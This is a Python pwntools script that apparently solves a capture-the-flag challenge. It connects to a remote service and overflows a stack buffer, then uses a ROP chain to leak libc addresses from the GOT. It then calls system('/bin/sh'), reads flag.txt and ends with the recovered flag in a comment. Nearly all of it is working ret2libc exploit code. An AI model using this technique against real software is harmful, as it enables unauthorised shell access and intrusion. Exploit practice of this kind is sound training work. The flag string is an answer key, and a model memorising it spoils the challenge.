from pwn import *
elf = context.binary = ELF('./vuln', checksec=False)

# p = process('./vuln')
p = remote('9.223.112.123', 60003)

offset = 0x18
pop_rdi = p64(0x400703)
plt_puts = p64(elf.plt['puts'])
got_puts = p64(elf.got['puts'])
got_fgets = p64(elf.got['fgets'])

# Leaking the Address and Finding the LIBC

payload = b'A' * offset
payload += pop_rdi + got_puts + plt_puts
payload += pop_rdi + got_fgets + plt_puts
payload += p64(elf.sym['main'])

p.sendlineafter(b'Send me your final message, champ:', payload)
p.recvline()
p.recvline()

leaked_puts = u64(p.recvline().strip()[:6].ljust(8, b'\x00'))
leaked_fgets = u64(p.recvline().strip()[:6].ljust(8, b'\x00'))
log.success(f"Leaked puts : {hex(leaked_puts)}")
log.success(f"Leaked fgets: {hex(leaked_fgets)}")

# Spawning the system("/bin/sh")

libc = ELF('./libc6_2.23-0ubuntu11.3_amd64.so', checksec=False)
libc.address = leaked_puts - libc.sym['puts']

binsh = next(libc.search(b'/bin/sh\x00'))
system = libc.sym['system']
ret = p64(0x4004c9)

payload = b'A' * offset + ret
payload += pop_rdi + p64(binsh) + p64(system)

p.sendlineafter(b'Send me your final message, champ:', payload)
p.recvline()
p.recvline()

p.sendline(b'cat flag.txt')
flag = p.recvall(timeout=1).strip()
log.success(flag.decode())
p.close()

# flag{8abc6018612d31b6270f1bd794da1fd6}